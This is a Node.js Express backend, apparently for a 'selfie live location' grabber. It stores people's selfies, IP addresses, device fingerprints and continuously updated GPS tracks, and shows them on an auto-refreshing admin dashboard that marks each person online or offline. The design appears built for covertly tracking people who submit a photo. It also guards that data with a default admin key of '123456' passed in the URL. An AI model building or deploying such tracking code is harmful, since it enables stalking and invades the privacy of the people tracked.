require("dotenv").config();

const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const app = express();

const PORT = process.env.PORT || 3000;
const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || "*";
const ADMIN_KEY = process.env.ADMIN_KEY || "123456";
const OFFLINE_AFTER_MS = 30 * 1000;
const MAX_LOCATION_POINTS = 300;

app.use(
  cors({
    origin: FRONTEND_ORIGIN === "*" ? "*" : FRONTEND_ORIGIN.split(",").map((x) => x.trim()),
    methods: ["GET", "POST", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(express.json({ limit: "25mb" }));

const dataDir = path.join(__dirname, "data");
const filePath = path.join(dataDir, "submissions.json");

function ensureDataFile() {
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
  if (!fs.existsSync(filePath)) fs.writeFileSync(filePath, "[]", "utf8");
}

function readSubmissions() {
  ensureDataFile();
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf8") || "[]");
  } catch (error) {
    console.error("Failed to read submissions:", error.message);
    return [];
  }
}

function writeSubmissions(submissions) {
  ensureDataFile();
  fs.writeFileSync(filePath, JSON.stringify(submissions, null, 2), "utf8");
}

function escapeHtml(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function makeId() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return `${Date.now()}-${Math.random().toString(16).slice(2)}`;
}

function clientIp(req) {
  const raw = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  return String(raw).split(",")[0].trim();
}

function detectDevice(userAgent = "") {
  const ua = String(userAgent);
  let browser = "Unknown Browser";
  let os = "Unknown OS";
  let type = "Unknown Device";

  if (/Edg\//i.test(ua)) browser = "Microsoft Edge";
  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = "Safari";
  else if (/Firefox\//i.test(ua)) browser = "Firefox";
  else if (/SamsungBrowser\//i.test(ua)) browser = "Samsung Internet";

  if (/iPhone/i.test(ua)) {
    os = "iOS";
    type = "iPhone";
  } else if (/iPad/i.test(ua)) {
    os = "iPadOS";
    type = "iPad";
  } else if (/Android/i.test(ua)) {
    os = "Android";
    type = "Android";
  } else if (/Windows NT/i.test(ua)) {
    os = "Windows";
    type = "Desktop";
  } else if (/Mac OS X/i.test(ua)) {
    os = "macOS";
    type = "Desktop";
  } else if (/Linux/i.test(ua)) {
    os = "Linux";
    type = "Desktop";
  }

  return `${browser} - ${type} - ${os}`;
}

function normalizeLocation(body) {
  const lat = body.lat === undefined || body.lat === null || body.lat === "" ? null : Number(body.lat);
  const lon = body.lon === undefined || body.lon === null || body.lon === "" ? null : Number(body.lon);
  const accuracy = body.accuracy === undefined || body.accuracy === null || body.accuracy === "" ? null : Number(body.accuracy);

  if (!Number.isFinite(lat) || !Number.isFinite(lon)) {
    return null;
  }

  return {
    lat,
    lon,
    accuracy: Number.isFinite(accuracy) ? accuracy : null,
    at: new Date().toISOString(),
  };
}

function isOnline(item) {
  if (!item.lastSeenAt) return false;
  return Date.now() - new Date(item.lastSeenAt).getTime() <= OFFLINE_AFTER_MS;
}

function requireAdmin(req, res, next) {
  if (req.query.key !== ADMIN_KEY) {
    return res.status(401).send("Unauthorized");
  }
  next();
}

app.get("/", (req, res) => {
  res.json({ ok: true, message: "Selfie Live Location API is running" });
});

app.get("/api/health", (req, res) => {
  res.json({ ok: true, message: "API healthy" });
});

app.post("/api/save-data", (req, res) => {
  const { image, deviceInfo = {}, userAgent } = req.body || {};

  if (!image || typeof image !== "string") {
    return res.status(400).json({ ok: false, error: "Image is required" });
  }

  const id = makeId();
  const now = new Date().toISOString();
  const ua = userAgent || req.headers["user-agent"] || "";
  const firstLocation = normalizeLocation(req.body || {});

  const item = {
    id,
    image,
    receivedAt: now,
    lastSeenAt: now,
    ip: clientIp(req),
    deviceName: detectDevice(ua),
    userAgent: ua,
    deviceInfo: {
      platform: deviceInfo.platform || "",
      language: deviceInfo.language || "",
      screen: deviceInfo.screen || "",
      timezone: deviceInfo.timezone || "",
    },
    firstLocation,
    lastLocation: firstLocation,
    locations: firstLocation ? [firstLocation] : [],
  };

  const submissions = readSubmissions();
  submissions.push(item);
  writeSubmissions(submissions);

  console.log("New selfie submission:", {
    id,
    hasImage: true,
    imageChars: image.length,
    hasLocation: Boolean(firstLocation),
    deviceName: item.deviceName,
    ip: item.ip,
  });

  res.json({ ok: true, id });
});

app.post("/api/live-location", (req, res) => {
  const { id } = req.body || {};
  const loc = normalizeLocation(req.body || {});

  if (!id) return res.status(400).json({ ok: false, error: "ID is required" });
  if (!loc) return res.status(400).json({ ok: false, error: "Valid lat/lon are required" });

  const submissions = readSubmissions();
  const item = submissions.find((entry) => entry.id === id);

  if (!item) return res.status(404).json({ ok: false, error: "Submission not found" });

  item.lastSeenAt = new Date().toISOString();
  item.lastLocation = loc;
  if (!item.firstLocation) item.firstLocation = loc;
  if (!Array.isArray(item.locations)) item.locations = [];
  item.locations.push(loc);
  if (item.locations.length > MAX_LOCATION_POINTS) {
    item.locations = item.locations.slice(item.locations.length - MAX_LOCATION_POINTS);
  }

  writeSubmissions(submissions);

  console.log("Live location updated:", {
    id,
    lat: loc.lat,
    lon: loc.lon,
    accuracy: loc.accuracy,
  });

  res.json({ ok: true, id });
});

app.post("/api/heartbeat", (req, res) => {
  const { id } = req.body || {};
  if (!id) return res.status(400).json({ ok: false, error: "ID is required" });

  const submissions = readSubmissions();
  const item = submissions.find((entry) => entry.id === id);

  if (!item) return res.status(404).json({ ok: false, error: "Submission not found" });

  item.lastSeenAt = new Date().toISOString();
  writeSubmissions(submissions);

  res.json({ ok: true, id });
});

app.get("/api/submissions", requireAdmin, (req, res) => {
  const submissions = readSubmissions().map((item) => ({
    ...item,
    online: isOnline(item),
    image: item.image ? "[hidden in JSON view]" : null,
  }));
  res.json({ ok: true, count: submissions.length, submissions });
});

app.post("/api/admin/delete/:id", requireAdmin, (req, res) => {
  const { id } = req.params;
  const submissions = readSubmissions();
  const before = submissions.length;
  const filtered = submissions.filter((item) => item.id !== id);
  writeSubmissions(filtered);

  console.log("Admin delete:", { id, deleted: before !== filtered.length });
  res.redirect(`/api/admin?key=${encodeURIComponent(req.query.key)}`);
});

app.delete("/api/submissions/:id", requireAdmin, (req, res) => {
  const { id } = req.params;
  const submissions = readSubmissions();
  const before = submissions.length;
  const filtered = submissions.filter((item) => item.id !== id);
  writeSubmissions(filtered);

  res.json({ ok: true, deleted: before !== filtered.length, id });
});

app.get("/api/admin", requireAdmin, (req, res) => {
  const submissions = readSubmissions().slice().reverse();

  const cards = submissions
    .map((item) => {
      const online = isOnline(item);
      const last = item.lastLocation;
      const first = item.firstLocation;
      const lastMap = last ? `https://www.google.com/maps?q=${encodeURIComponent(last.lat)},${encodeURIComponent(last.lon)}` : "";
      const firstMap = first ? `https://www.google.com/maps?q=${encodeURIComponent(first.lat)},${encodeURIComponent(first.lon)}` : "";
      const points = Array.isArray(item.locations) ? item.locations.slice(-10).reverse() : [];

      const imageHtml = item.image && String(item.image).startsWith("data:image")
        ? `<img src="${item.image}" alt="selfie" />`
        : `<div class="no-image">No image preview</div>`;

      const pointsHtml = points.length
        ? points
            .map((p, index) => {
              const link = `https://www.google.com/maps?q=${encodeURIComponent(p.lat)},${encodeURIComponent(p.lon)}`;
              return `<li><a href="${link}" target="_blank">Point ${index + 1}: ${escapeHtml(p.lat)}, ${escapeHtml(p.lon)}</a> <span>${escapeHtml(p.at || "")}</span></li>`;
            })
            .join("")
        : `<li>No live points yet</li>`;

      return `
        <article class="card">
          <div class="card-head">
            <div>
              <div class="status ${online ? "online" : "offline"}">${online ? "ONLINE" : "OFFLINE"}</div>
              <h2>${escapeHtml(item.deviceName || "Unknown device")}</h2>
              <p class="id">${escapeHtml(item.id)}</p>
            </div>

            <form method="POST" action="/api/admin/delete/${encodeURIComponent(item.id)}?key=${encodeURIComponent(req.query.key)}" onsubmit="return confirm('Delete this record?')">
              <button class="delete" type="submit">Delete</button>
            </form>
          </div>

          <div class="grid">
            <div>${imageHtml}</div>
            <div class="meta">
              <p><b>Received:</b> ${escapeHtml(item.receivedAt || "")}</p>
              <p><b>Last seen:</b> ${escapeHtml(item.lastSeenAt || "")}</p>
              <p><b>IP:</b> ${escapeHtml(item.ip || "")}</p>
              <p><b>Platform:</b> ${escapeHtml(item.deviceInfo?.platform || "")}</p>
              <p><b>Screen:</b> ${escapeHtml(item.deviceInfo?.screen || "")}</p>
              <p><b>Language:</b> ${escapeHtml(item.deviceInfo?.language || "")}</p>
              <p><b>Timezone:</b> ${escapeHtml(item.deviceInfo?.timezone || "")}</p>
              <p><b>First location:</b> ${first ? `<a href="${firstMap}" target="_blank">Open map</a> (${escapeHtml(first.lat)}, ${escapeHtml(first.lon)})` : "No location"}</p>
              <p><b>Last live location:</b> ${last ? `<a href="${lastMap}" target="_blank">Open live map</a> (${escapeHtml(last.lat)}, ${escapeHtml(last.lon)})` : "No location"}</p>
              <p><b>Accuracy:</b> ${last?.accuracy ? `${escapeHtml(last.accuracy)} m` : "N/A"}</p>
            </div>
          </div>

          <details>
            <summary>Last live location points (${escapeHtml(item.locations?.length || 0)})</summary>
            <ul>${pointsHtml}</ul>
          </details>
        </article>
      `;
    })
    .join("");

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <meta http-equiv="refresh" content="7" />
      <title>Live Admin</title>
      <style>
        * { box-sizing: border-box; }
        body {
          margin: 0;
          font-family: Arial, sans-serif;
          background: #f3f4f6;
          color: #111827;
          padding: 18px;
        }
        header {
          max-width: 1100px;
          margin: 0 auto 18px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          gap: 12px;
        }
        h1 { margin: 0; font-size: 26px; }
        .hint { margin: 5px 0 0; color: #6b7280; font-size: 14px; }
        .wrap { max-width: 1100px; margin: 0 auto; }
        .card {
          background: #fff;
          border-radius: 16px;
          padding: 16px;
          margin-bottom: 16px;
          box-shadow: 0 8px 30px rgba(0,0,0,.08);
          border: 1px solid #e5e7eb;
        }
        .card-head {
          display: flex;
          justify-content: space-between;
          gap: 12px;
          align-items: flex-start;
          margin-bottom: 14px;
        }
        h2 { margin: 6px 0 2px; font-size: 20px; }
        .id { margin: 0; color: #6b7280; font-size: 12px; word-break: break-all; }
        .status { display: inline-flex; padding: 5px 9px; border-radius: 999px; font-size: 12px; font-weight: 700; }
        .online { background: #dcfce7; color: #166534; }
        .offline { background: #fee2e2; color: #991b1b; }
        .delete {
          border: 0;
          background: #dc2626;
          color: #fff;
          border-radius: 10px;
          padding: 10px 14px;
          font-weight: 700;
          cursor: pointer;
        }
        .grid {
          display: grid;
          grid-template-columns: minmax(220px, 360px) 1fr;
          gap: 16px;
          align-items: start;
        }
        img {
          width: 100%;
          border-radius: 14px;
          border: 1px solid #e5e7eb;
          display: block;
        }
        .no-image {
          padding: 30px;
          background: #f9fafb;
          border: 1px dashed #d1d5db;
          border-radius: 14px;
          color: #6b7280;
        }
        .meta p { margin: 8px 0; line-height: 1.4; word-break: break-word; }
        a { color: #2563eb; font-weight: 700; text-decoration: none; }
        details { margin-top: 14px; }
        summary { cursor: pointer; font-weight: 700; }
        li { margin: 8px 0; }
        li span { color: #6b7280; font-size: 12px; }
        @media (max-width: 760px) {
          header, .card-head { flex-direction: column; }
          .grid { grid-template-columns: 1fr; }
          body { padding: 12px; }
        }
      </style>
    </head>
    <body>
      <header>
        <div>
          <h1>Live Admin</h1>
          <p class="hint">Auto refresh every 7 seconds. Online means last heartbeat within 30 seconds.</p>
        </div>
        <strong>Total: ${submissions.length}</strong>
      </header>
      <main class="wrap">
        ${cards || "<p>No submissions yet.</p>"}
      </main>
    </body>
    </html>
  `);
});

app.use((req, res) => {
  res.status(404).json({ ok: false, error: "Not found" });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
